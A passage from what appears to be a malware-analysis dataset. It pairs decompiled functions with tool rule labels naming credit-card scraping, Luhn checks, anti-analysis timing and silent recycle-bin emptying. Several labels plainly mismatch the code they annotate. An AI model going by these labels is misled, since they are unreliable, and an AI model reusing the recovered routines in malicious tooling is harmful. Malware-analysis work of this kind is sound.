        "decompiled_code": "\nint32_t __fastcall fcn.004137b1(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    ulong uVar4;\n    \n    if ((param_2 != 0) && (in_EAX != 0)) {\n        uVar4 = fcn.0041379d(param_2);\n        iVar1 = uVar4;\n        if (iVar1 != 0) {\n            iVar3 = 0;\n            uVar2 = 0x80000000;\n            do {\n                if ((uVar2 & *((uVar4 >> 0x20) + -4 + iVar1 * 4)) != 0) break;\n                iVar3 = iVar3 + 1;\n                uVar2 = uVar2 >> 1;\n            } while (uVar2 != 0);\n            return iVar1 * 0x20 - iVar3;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 228
    },
    "0041171b": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint fcn.0041171b(int32_t param_1, uint param_2, uint param_3)\n\n{\n    uint32_t *puVar1;\n    int32_t *in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t n;\n    \n    n = param_1 + 0x1fU >> 5;\n    fcn.00411219(n);\n    fcn.0040dbea(*in_EAX, n << 2, param_2, param_3);\n    uVar3 = 1;\n    for (uVar2 = param_1 - 1U & 0x1f; uVar2 != 0; uVar2 = uVar2 - 1) {\n        uVar3 = uVar3 | uVar3 * 2;\n    }\n    puVar1 = *in_EAX + -4 + n * 4;\n    *puVar1 = *puVar1 & uVar3;\n    in_EAX[1] = n;\n    return 0;\n}\n",
        "token_count": 235
    },
    "004139b7": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint __thiscall fcn.004139b7(uint32_t param_1, int32_t param_2, uint32_t param_3)\n\n{\n    uint32_t *puVar1;\n    \n    if (param_3 <= param_1 >> 5) {\n        return 0xffffffff;\n    }\n    puVar1 = param_2 + (param_1 >> 5) * 4;\n    *puVar1 = *puVar1 | 1 << (param_1 & 0x1f);\n    return 0;\n}\n",
        "token_count": 119
    },
    "0040b074": {
        "rules": [
            "parse credit card information/92c3fd9898ba41b4bad3ffb6188f4688",
            "search for credit card data/212a26c2b8d740cd9f6579dba482d653"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040b0fe)\n// WARNING: Removing unreachable block (ram,0x0040b110)\n// WARNING: Removing unreachable block (ram,0x0040b12b)\n// WARNING: Removing unreachable block (ram,0x0040b12d)\n// WARNING: Removing unreachable block (ram,0x0040b131)\n// WARNING: Removing unreachable block (ram,0x0040b136)\n// WARNING: Removing unreachable block (ram,0x0040b13a)\n// WARNING: Removing unreachable block (ram,0x0040b149)\n// WARNING: Removing unreachable block (ram,0x0040b14b)\n// WARNING: Removing unreachable block (ram,0x0040b14f)\n// WARNING: Removing unreachable block (ram,0x0040b158)\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0040b074(void)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    uint s;\n    uint var_1b4h;\n    uint var_12ch;\n    uint var_4h;\n    \n    sub.ntdll.dll_memset(&s, 0, 0x1c0);\n    uVar1 = *0x41bb08 | *0x41bb0c;\n    if ((uVar1 == 0) && (uVar1 = *0x41e3fd,  uVar1 < (*0x41b13c ^ 0x69U))) {\n        if ((uVar1 != 0) && (0xda < uVar1)) {\n            bVar2 = uVar1 != 0;\n            uVar1 = -uVar1;\n            *0x41bb0c = -bVar2;\n            *0x41bb08 = uVar1;\n        }\n        uVar1 = uVar1 & 0xffffff00 | var_1b4h;\n    }\n    else {\n        uVar1 = uVar1 & 0xffffff00 | var_12ch;\n    }\n    return uVar1;\n}\n",
        "token_count": 456
    },
    "0040b31b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040b31b(int32_t param_1, uint16_t param_2, char *param_3)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int16_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint16_t uVar7;\n    char *pcVar8;\n    ulong uVar9;\n    int64_t iVar10;\n    uint8_t uStack46;\n    uint8_t uStack45;\n    char *pcStack44;\n    int32_t iStack40;\n    int32_t iStack36;\n    int32_t iStack28;\n    \n    uVar7 = 0;\n    *0x41e3fd = *0x41b13c != 0;\n    param_3[0x100] = '\\0';\n    uStack46 = 0;\n    uStack45 = 0;\n    iVar6 = 6;\n    do {\n        *0x41e3fd = (*0x41e3fd | *0x41b13c - 0xfeU) != 0;\n        iVar6 = iVar6 + -1;\n    } while (0 < iVar6);\n    param_3[0x101] = '\\0';\n    fcn.0040afe7();\n    pcVar8 = param_3;\n    do {\n        fcn.0040b186(100);\n        *pcVar8 = uVar7;\n        iVar6 = 2;\n        do {\n            fcn.0040b261(*0x41b036);\n            iVar6 = iVar6 + -1;\n        } while (iVar6 != 0);\n        uVar7 = uVar7 + 1;\n        pcVar8 = pcVar8 + 1;\n    } while (uVar7 < 0x100);\n    pcStack44 = param_3;\n    iStack36 = 0x100;\n    do {\n        iVar6 = *0x41bb00;\n        cVar1 = *pcStack44;\n        iStack40 = 0;\n        uStack45 = uStack45 + *(uStack46 + param_1) + cVar1;\n        *pcStack44 = param_3[uStack45];\n        param_3[uStack45] = cVar1;\n        uVar7 = *0x41b13c;\n        *0x41e3fd = *0x41b13c != 0;\n        uStack46 = uStack46 + 1;\n        if (uStack46 == param_2) {\n            uVar9 = fcn.0040afe7();\n            iVar3 = *0x41bb0c;\n            uVar2 = *0x41bb08;\n            uVar5 = uVar9 >> 0x20;\n            if (uVar9 < uVar5) {\n                uVar5 = *0x41b3fc;\n                uVar9 = sub.ntdll.dll__allmul(*0x41bb08, *0x41bb0c, 0x75, 0);\n                if ((uVar9 == uVar5 - 5) && (uVar9 >> 0x20 == iStack28)) {\ncode_r0x0040b498:\n                    uVar9 = fcn.0040b00a(uVar7);\n                    uVar5 = uVar9 | *0x41e3fd | uVar9 >> 0x20;\n                    goto code_r0x0040b43c;\n                }\n                uVar5 = *0x41e3fd;\n                uVar9 = fcn.0040b00a(uVar7);\n                if ((uVar5 == uVar9) && (uVar9 >> 0x20 == 0)) goto code_r0x0040b498;\n                *0x41e3fd = uVar7 + uVar5 != 0;\n            }\n            else {\n                uVar5 = uVar5 - (*0x41bb08 & 0x48) | (uVar5 >> 0x1f) - (uVar5 < (*0x41bb08 & 0x48));\ncode_r0x0040b43c:\n                if (uVar5 == 0) {\n                    *0x41e3fd = false;\n                }\n                else {\n                    *0x41e3fd = true;\n                }\n            }\n            uVar5 = *0x41e3fd;\n            uStack46 = 0;\n            if ((iVar3 != 0) || ((uVar5 <= (uVar2 | 0x86) && (uVar5 <= uVar2)))) {\n                iStack40 = iVar6 + 0x87;\n                goto code_r0x0040b565;\n            }\n            if (((*0x41e3fd != uVar7) || (*0x41e3fd != false)) || ((uVar2 | 0xa2) == uVar5)) {\n                iVar6 = 5;\n                do {\n                    *0x41e3fd = (uVar7 + 5U & *0x41e3fd) != 0;\n                    iVar6 = iVar6 + -1;\n                } while (iVar6 != 0);\n                goto code_r0x0040b565;\n            }\n            uVar9 = fcn.0040afe7();\n            if (uVar9 >> 0x20 < uVar9) goto code_r0x0040b565;\n            iVar10 = sub.ntdll.dll__allmul();\n            if (iVar10 == 0) {\n                *0x41e3fd = 0;\n                goto code_r0x0040b569;\n            }\n            *0x41e3fd = 1;\n        }\n        else {\ncode_r0x0040b565:\n            if (*0x41e3fd == 0) {\ncode_r0x0040b569:\n                *0x41e3fd = *0x41e3fd - iStack40 != -0xd6;\n            }\n        }\n        pcStack44 = pcStack44 + 1;\n        iStack36 = iStack36 + -1;\n        if (iStack36 == 0) {\n            iVar6 = 6;\n            do {\n                iVar4 = fcn.0040b186(0x50);\n                *0x41e3fd = (iVar4 >> 0xf) + *0x41e3fd != 0;\n                iVar6 = iVar6 + -1;\n            } while (0 < iVar6);\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 1449
    },
    "0040c40d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.0040c40d(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint lpSystemInfo;\n    uint var_20h;\n    \n    lpSystemInfo = 0;\n    puVar2 = &var_20h;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetNativeSystemInfo)(&lpSystemInfo);\n    return lpSystemInfo == 9;\n}\n",
        "token_count": 147
    },
    "0040fa72": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nuint8_t * __cdecl fcn.0040fa72(uint8_t *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint8_t uVar7;\n    uint8_t *puVar8;\n    uint32_t var_4h;\n    \n    piVar3 = arg_ch;\n    uVar7 = *arg_8h;\n    *arg_ch = 0;\n    arg_ch[1] = 0;\n    arg_ch[2] = 0;\n    piVar1 = arg_ch + 4;\n    arg_ch[3] = 0;\n    arg_ch = arg_8h;\n    *piVar1 = 0;\n    if (uVar7 == 0x2a) {\n        piVar3[1] = piVar3[1] | 0x40;\n        arg_ch = arg_8h + 1;\n    }\n    iVar4 = fcn.004109f1();\n    piVar3[2] = iVar4;\n    if (iVar4 == 0) {\n        piVar3[2] = -1;\n    }\n    uVar7 = *arg_ch;\n    if (uVar7 == 0x6c) {\n        if (*(arg_ch + 1) == 0x6c) {\n            piVar3[1] = piVar3[1] | 0x10;\n            arg_ch = arg_ch + 2;\n        }\n        else {\n            piVar3[1] = piVar3[1] | 1;\n            arg_ch = arg_ch + 1;\n        }\n        goto code_r0x0040fb2b;\n    }\n    if (uVar7 == 0x68) {\n        piVar3[1] = piVar3[1] | 2;\n    }\n    else if (uVar7 == 0x77) {\n        piVar3[1] = piVar3[1] | 4;\n    }\n    else {\n        if (uVar7 != 0x4c) {\n            if (uVar7 == 0x49) {\n                if ((*(arg_ch + 1) == 0x36) && (*(arg_ch + 2) == 0x34)) {\n                    uVar5 = piVar3[1] & 0xfffffff7U | 0x10;\n                }\n                else {\n                    if ((*(arg_ch + 1) != 0x33) || (*(arg_ch + 2) != 0x32)) {\n                        piVar3[1] = piVar3[1] & 0xffffffe7U | 0x20;\n                        arg_ch = arg_ch + 1;\n                        goto code_r0x0040fb2b;\n                    }\n                    uVar5 = piVar3[1] & 0xffffffefU | 8;\n                }\n                piVar3[1] = uVar5;\n                arg_ch = arg_ch + 3;\n            }\n            goto code_r0x0040fb2b;\n        }\n        piVar3[1] = piVar3[1] | 0x10;\n    }\n    arg_ch = arg_ch + 1;\ncode_r0x0040fb2b:\n    iVar4 = fcn.0040f93e();\n    if (iVar4 == 0) {\n        arg_ch = arg_8h + -1;\n    }\n    else if (*piVar3 == 9) {\n        iVar4 = fcn.0040ae05(8);\n        puVar8 = arg_ch + 1;\n        uVar7 = *puVar8;\n        piVar3[4] = iVar4;\n        if (uVar7 == 0x5e) {\n            puVar8 = arg_ch + 2;\n            *(piVar3 + 3) = 1;\n        }\n        arg_ch = puVar8;\n        arg_ch._3_1_ = 0;\n        if (*puVar8 == 0x5d) {\n            *(iVar4 + 0xb) = *(iVar4 + 0xb) | 0x20;\n            arg_ch = puVar8 + 1;\n            arg_ch._3_1_ = 0x5d;\n        }\n        while ((uVar7 = *arg_ch,  uVar7 != 0 && (uVar7 != 0x5d))) {\n            if ((uVar7 == 0x2d) && ((arg_ch._3_1_ != 0 && (uVar2 = *(arg_ch + 1),  uVar2 != 0x5d)))) {\n                uVar7 = uVar2;\n                if (arg_ch._3_1_ < uVar2) {\n                    uVar7 = arg_ch._3_1_;\n                    arg_ch._3_1_ = uVar2;\n                }\n                if (uVar7 < arg_ch._3_1_) {\n                    var_4h = arg_ch._3_1_ - uVar7;\n                    iVar6 = uVar7;\n                    do {\n                        puVar8 = (iVar6 >> 3) + iVar4;\n                        *puVar8 = *puVar8 | '\\x01' << (iVar6 & 7);\n                        iVar6 = iVar6 + 1;\n                        var_4h = var_4h - 1;\n                    } while (var_4h != 0);\n                }\n                puVar8 = (arg_ch._3_1_ >> 3) + iVar4;\n                *puVar8 = *puVar8 | '\\x01' << (arg_ch._3_1_ & 7);\n                arg_ch = arg_ch + 2;\n                arg_ch._3_1_ = 0;\n            }\n            else {\n                puVar8 = (uVar7 >> 3) + iVar4;\n                *puVar8 = *puVar8 | '\\x01' << (uVar7 & 7);\n                arg_ch = arg_ch + 1;\n                arg_ch._3_1_ = uVar7;\n            }\n        }\n    }\n    return arg_ch + (1 - arg_8h);\n}\n",
        "token_count": 1382
    },
    "0040c985": {
        "rules": [
            "hash data using aphash/ab9c9a8537c84744923d9bbb8bd71d10"
        ],
        "decompiled_code": "\nuint fcn.0040c985(void)\n\n{\n    ulong uVar1;\n    uint uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    \n    uVar2 = *0x41c030;\n    if (in_EAX == 0) {\n        return 0;\n    }\n    if (*0x41c03c == 0x12345678) {\n        uVar1 = rdtsc();\n        *0x41c03c = uVar1;\n    }\n    *0x41c03c = *0x41c03c << 0xb ^ *0x41c03c;\n    uVar3 = (*0x41c038 >> 0xb ^ *0x41c03c) >> 8 ^ *0x41c038 ^ *0x41c03c;\n    *0x41c030 = *0x41c034;\n    *0x41c034 = *0x41c038;\n    *0x41c038 = uVar3;\n    *0x41c03c = uVar2;\n    return (uVar3 % (in_EAX * 100)) / 100;\n}\n",
        "token_count": 260
    },
    "00410418": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/101d11b5106849ad963488c88a9294b9",
            "validate payment card number using luhn algorithm with lookup table/77a25ea9f6f245cfb8807f7953974472"
        ],
        "decompiled_code": "\nint32_t fcn.00410418(void)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint16_t *puVar3;\n    uint16_t **unaff_ESI;\n    \n    puVar3 = *unaff_ESI;\n    iVar2 = 0;\n    while( true ) {\n        uVar1 = *puVar3;\n        if ((uVar1 < 0x30) || (0x39 < uVar1)) break;\n        iVar2 = iVar2 * 10 + -0x30 + uVar1;\n        puVar3 = puVar3 + 1;\n    }\n    *unaff_ESI = puVar3;\n    return iVar2;\n}\n",
        "token_count": 156
    },
    "004109f1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/101d11b5106849ad963488c88a9294b9",
            "validate payment card number using luhn algorithm with lookup table/77a25ea9f6f245cfb8807f7953974472"
        ],
        "decompiled_code": "\nint32_t fcn.004109f1(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char **unaff_ESI;\n    \n    iVar2 = 0;\n    for (pcVar3 = *unaff_ESI; (cVar1 = *pcVar3,  '/' < cVar1 && (cVar1 < ':')); pcVar3 = pcVar3 + 1) {\n        iVar2 = iVar2 * 10 + -0x30 + cVar1;\n    }\n    *unaff_ESI = pcVar3;\n    return iVar2;\n}\n",
        "token_count": 137
    },
    "0040ee25": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040ee25(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    \n    if (param_2 != 0) {\n        puVar2 = param_1 + 1;\n        puVar1 = param_3 + 2;\n        iVar3 = (param_2 - 1U >> 2) + 1;\n        do {\n            puVar2[-1] = puVar1[-2];\n            *puVar2 = puVar1[-1];\n            puVar2[1] = *puVar1;\n            puVar2[2] = puVar1[1];\n            puVar1 = puVar1 + 4;\n            puVar2 = puVar2 + 4;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 216
    },
    "004112a9": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nuint fcn.004112a9(uint param_1, int32_t param_2)\n\n{\n    uint *in_EAX;\n    uint32_t n;\n    ulong uVar1;\n    \n    n = param_2 + 3U >> 2;\n    fcn.00411219(n);\n    fcn.00413b9c(*in_EAX, n, param_1);\n    uVar1 = fcn.0041379d(*in_EAX);\n    in_EAX[1] = uVar1;\n    return uVar1 >> 0x20;\n}\n",
        "token_count": 126
    },
    "00412944": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00412944(uint32_t *arg_8h)\n\n{\n    uint arg_8h_00;\n    uint32_t *puVar1;\n    char cVar2;\n    int16_t iVar3;\n    uint32_t in_EAX;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t in_ECX;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = arg_8h;\n    uVar4 = (in_ECX & 0xffff) * (in_EAX >> 0x10);\n    uVar7 = (in_ECX & 0xffff) * (in_EAX & 0xffff);\n    uVar6 = (in_ECX >> 0x10) * (in_EAX & 0xffff) + uVar4;\n    *arg_8h = uVar7;\n    *0x41b038 = -0xe6;\n    if (uVar6 < uVar4) {\n        iVar5 = 1;\n    }\n    else {\n        iVar5 = 0;\n        if ((*0x41b110 & 0x59) == 0x18) {\n            *0x41b038 = -0x47d2;\n        }\n    }\n    iVar5 = iVar5 * 0x10000 + (uVar6 >> 0x10);\n    iVar3 = fcn.0041286e(0x24f480c);\n    *0x41b038 = *0x41b038 + iVar3;\n    uVar7 = uVar7 + uVar6 * 0x10000;\n    *0x41b038 = *0x41b038 + -0x93;\n    *arg_8h = uVar7;\n    arg_8h = iVar5;\n    if (uVar7 < uVar6 * 0x10000) {\n        arg_8h = iVar5 + 1;\n    }\n    uVar4 = (in_ECX >> 0x10) * (in_EAX >> 0x10);\n    *0x41b038 = *0x41b038 + 0x84;\n    puVar1[1] = uVar4;\n    cVar2 = fcn.0041286e(0x27884d5);\n    arg_8h_00 = *0x41b03c;\n    *0x41b038 = *0x41b038 >> (cVar2 - 0x3aU & 0x1f);\n    puVar1[1] = uVar4 + arg_8h;\n    iVar3 = fcn.0041286e(arg_8h_00);\n    *0x41b038 = *0x41b038 & iVar3 + 0x7aU;\n    return 0;\n}\n",
        "token_count": 641
    },
    "00412a32": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00412adb)\n\nvoid __cdecl fcn.00412a32(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint arg_8h_00;\n    int16_t iVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint32_t *unaff_ESI;\n    int64_t iVar4;\n    \n    iVar1 = fcn.0041286e(0x68b6eb);\n    *0x41b038 = *0x41b038 - iVar1;\n    iVar1 = fcn.0041286e(0x27816fa);\n    arg_8h_00 = *0x41b03c;\n    *0x41b038 = iVar1 + 0x1ad;\n    iVar3 = arg_8h * arg_10h + arg_8h * arg_ch * 0x10000;\n    iVar1 = fcn.0041286e(*0x41b03c);\n    *0x41b038 = *0x41b038 + iVar1 * -0xf2 + -0xe6;\n    *unaff_ESI = *unaff_ESI - iVar3;\n    uVar2 = fcn.0041286e(0x43a362);\n    *0x41b038 = *0x41b038 ^ uVar2;\n    if (-iVar3 - 1U <= *unaff_ESI && *unaff_ESI != -iVar3 - 1U) {\n        iVar4 = fcn.0041286e(arg_8h_00);\n        if (iVar4 <= *0x41b038) {\n            arg_8h._3_1_ = iVar3 >> 0x18;\n            *0x41b038 = *0x41b038 | arg_8h._3_1_ + 0x96;\n        }\n        unaff_ESI[1] = unaff_ESI[1] - 1;\n    }\n    unaff_ESI[1] = unaff_ESI[1] - (arg_8h * arg_ch >> 0x10);\n    iVar1 = fcn.0041286e(0x1f79f2b);\n    *0x41b038 = *0x41b038 ^ iVar1 * 0xe;\n    return;\n}\n",
        "token_count": 529
    },
    "0040f255": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nbool fcn.0040f255(void)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint lptstrFilename;\n    uint *unaff_ESI;\n    bool bVar4;\n    uint *s1;\n    uint var_34h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    \n    bVar4 = false;\n    cVar2 = fcn.0040f871();\n    if (cVar2 != '\\0') {\n        *unaff_ESI = 0x11c;\n        pcVar1 = _sym.imp.KERNEL32.dll_GetVersionExW;\n        bVar4 = true;\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetVersionExW)();\n        if (iVar3 == 0) {\n            *unaff_ESI = 0x114;\n            iVar3 = (*pcVar1)();\n            bVar4 = iVar3 != 0;\n            if (!bVar4) {\n                return bVar4;\n            }\n        }\n        s1 = &var_34h;\n        lptstrFilename = fcn.0040a88f(0x418e5c, 0xc, 0xc44d937b, 0);\n        fcn.0040f1cc(lptstrFilename, s1);\n        unaff_ESI[1] = var_2ch >> 0x10;\n        unaff_ESI[2] = var_2ch & 0xffff;\n        unaff_ESI[3] = var_28h >> 0x10;\n    }\n    return bVar4;\n}\n",
        "token_count": 359
    },
    "004126c9": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid fcn.004126c9(void)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint32_t *unaff_ESI;\n    int32_t iVar4;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *unaff_ESI + 7;\n    iVar4 = (iVar4 >> 0x1f & 7U) + iVar4 >> 3;\n    uVar2 = *unaff_ESI & 0x80000007;\n    if (uVar2 < 0) {\n        uVar2 = (uVar2 - 1 | 0xfffffff8) + 1;\n    }\n    if (0 < iVar4) {\n        puVar1 = unaff_ESI + 2;\n        var_ch = iVar4;\n        do {\n            *puVar1 = *((0x80 - iVar4) + puVar1);\n            puVar1 = puVar1 + 1;\n            var_ch = var_ch + -1;\n        } while (var_ch != 0);\n    }\n    if (iVar4 < 0x80) {\n        sub.ntdll.dll_memset(iVar4 + 8 + unaff_ESI, 0, 0x80 - iVar4);\n    }\n    if ((0 < uVar2) && (0 < iVar4)) {\n        puVar1 = unaff_ESI + 2;\n        do {\n            uVar3 = *puVar1 << (8 - uVar2 & 0x1f);\n            *puVar1 = uVar3;\n            if ((-7 - unaff_ESI) + puVar1 < 0x80) {\n                *puVar1 = (puVar1 + -unaff_ESI + 1)[unaff_ESI] >> (uVar2 & 0x1f) | uVar3;\n            }\n            puVar1 = puVar1 + 1;\n        } while (-unaff_ESI + -8 + puVar1 < iVar4);\n    }\n    return;\n}\n",
        "token_count": 473
    },
    "00410531": {
        "rules": [
            "encrypt data using Curve25519/bbf924b96e5b4ce780ce59f68f21b030"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00410531(int16_t *arg_8h, uint *arg_ch)\n\n{\n    uint *puVar1;\n    int16_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    \n    puVar3 = arg_ch;\n    iVar2 = *arg_8h;\n    *arg_ch = 0;\n    arg_ch[1] = 0;\n    puVar1 = arg_ch + 3;\n    arg_ch[2] = 0;\n    arg_ch = arg_8h;\n    *puVar1 = 0;\n    if (iVar2 == 0x2d) {\n        puVar3[1] = puVar3[1] | 1;\n        arg_ch = arg_8h + 1;\n    }\n    if (*arg_ch == 0x2b) {\n        arg_ch = arg_ch + 2;\n        puVar3[1] = puVar3[1] & 0xfffffbff | 0x200;\n    }\n    if (*arg_ch == 0x20) {\n        if ((puVar3[1] & 0x200) == 0) {\n            puVar3[1] = puVar3[1] | 0x400;\n        }\n        arg_ch = arg_ch + 2;\n    }\n    if (*arg_ch == 0x23) {\n        puVar3[1] = puVar3[1] | 2;\n        arg_ch = arg_ch + 2;\n    }\n    if (*arg_ch == 0x30) {\n        puVar3[1] = puVar3[1] | 0x1004;\n        arg_ch = arg_ch + 2;\n    }\n    iVar4 = fcn.00410418();\n    puVar3[2] = iVar4;\n    if ((iVar4 != 0) && ((puVar3[1] & 2) != 0)) {\n        puVar3[1] = puVar3[1] | 0x1000;\n    }\n    if (*arg_ch == 0x2e) {\n        arg_ch = arg_ch + 2;\n        uVar5 = fcn.00410418();\n        puVar3[3] = uVar5;\n    }\n    iVar2 = *arg_ch;\n    if (iVar2 == 0x6c) {\n        if (*(arg_ch + 2) == 0x6c) {\n            puVar3[1] = puVar3[1] | 0x100;\n            arg_ch = arg_ch + 4;\n        }\n        else {\n            puVar3[1] = puVar3[1] | 8;\n            arg_ch = arg_ch + 2;\n        }\n        goto code_r0x0041067e;\n    }\n    if (iVar2 == 0x68) {\n        puVar3[1] = puVar3[1] | 0x10;\n    }\n    else {\n        if (iVar2 != 0x77) {\n            if (iVar2 == 0x49) {\n                if ((*(arg_ch + 2) == 0x36) && (*(arg_ch + 4) == 0x34)) {\n                    uVar6 = puVar3[1] & 0xffffff7f | 0x100;\n                }\n                else {\n                    if ((*(arg_ch + 2) != 0x33) || (*(arg_ch + 4) != 0x32)) {\n                        puVar3[1] = puVar3[1] & 0xfffffe7f | 0x800;\n                        arg_ch = arg_ch + 2;\n                        goto code_r0x0041067e;\n                    }\n                    uVar6 = puVar3[1] & 0xfffffeff | 0x80;\n                }\n                puVar3[1] = uVar6;\n                arg_ch = arg_ch + 6;\n            }\n            goto code_r0x0041067e;\n        }\n        puVar3[1] = puVar3[1] | 0x40;\n    }\n    arg_ch = arg_ch + 2;\ncode_r0x0041067e:\n    iVar4 = fcn.0041043c(0);\n    if (iVar4 == 0) {\n        arg_ch = arg_8h + -1;\n    }\n    return (arg_ch - arg_8h >> 1) + 1;\n}\n",
        "token_count": 991
    },
    "00410a11": {
        "rules": [
            "encrypt data using Curve25519/bbf924b96e5b4ce780ce59f68f21b030"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00410a11(char *arg_8h, uint *arg_ch)\n\n{\n    uint *puVar1;\n    char cVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    \n    puVar3 = arg_ch;\n    cVar2 = *arg_8h;\n    *arg_ch = 0;\n    arg_ch[1] = 0;\n    puVar1 = arg_ch + 3;\n    arg_ch[2] = 0;\n    arg_ch = arg_8h;\n    *puVar1 = 0;\n    if (cVar2 == '-') {\n        puVar3[1] = puVar3[1] | 1;\n        arg_ch = arg_8h + 1;\n    }\n    if (*arg_ch == '+') {\n        arg_ch = arg_ch + 1;\n        puVar3[1] = puVar3[1] & 0xfffffbff | 0x200;\n    }\n    if (*arg_ch == ' ') {\n        if ((puVar3[1] & 0x200) == 0) {\n            puVar3[1] = puVar3[1] | 0x400;\n        }\n        arg_ch = arg_ch + 1;\n    }\n    if (*arg_ch == '#') {\n        puVar3[1] = puVar3[1] | 2;\n        arg_ch = arg_ch + 1;\n    }\n    if (*arg_ch == '0') {\n        puVar3[1] = puVar3[1] | 0x1004;\n        arg_ch = arg_ch + 1;\n    }\n    iVar4 = fcn.004109f1();\n    puVar3[2] = iVar4;\n    if ((iVar4 != 0) && ((puVar3[1] & 2) != 0)) {\n        puVar3[1] = puVar3[1] | 0x1000;\n    }\n    if (*arg_ch == '.') {\n        arg_ch = arg_ch + 1;\n        uVar5 = fcn.004109f1();\n        puVar3[3] = uVar5;\n    }\n    cVar2 = *arg_ch;\n    if (cVar2 == 'l') {\n        if (*(arg_ch + 1) == 'l') {\n            puVar3[1] = puVar3[1] | 0x100;\n            arg_ch = arg_ch + 2;\n        }\n        else {\n            puVar3[1] = puVar3[1] | 8;\n            arg_ch = arg_ch + 1;\n        }\n        goto code_r0x00410b41;\n    }\n    if (cVar2 == 'h') {\n        puVar3[1] = puVar3[1] | 0x10;\n    }\n    else {\n        if (cVar2 != 'w') {\n            if (cVar2 == 'I') {\n                if ((*(arg_ch + 1) == '6') && (*(arg_ch + 2) == '4')) {\n                    uVar6 = puVar3[1] & 0xffffff7f | 0x100;\n                }\n                else {\n                    if ((*(arg_ch + 1) != '3') || (*(arg_ch + 2) != '2')) {\n                        puVar3[1] = puVar3[1] & 0xfffffe7f | 0x800;\n                        arg_ch = arg_ch + 1;\n                        goto code_r0x00410b41;\n                    }\n                    uVar6 = puVar3[1] & 0xfffffeff | 0x80;\n                }\n                puVar3[1] = uVar6;\n                arg_ch = arg_ch + 3;\n            }\n            goto code_r0x00410b41;\n        }\n        puVar3[1] = puVar3[1] | 0x40;\n    }\n    arg_ch = arg_ch + 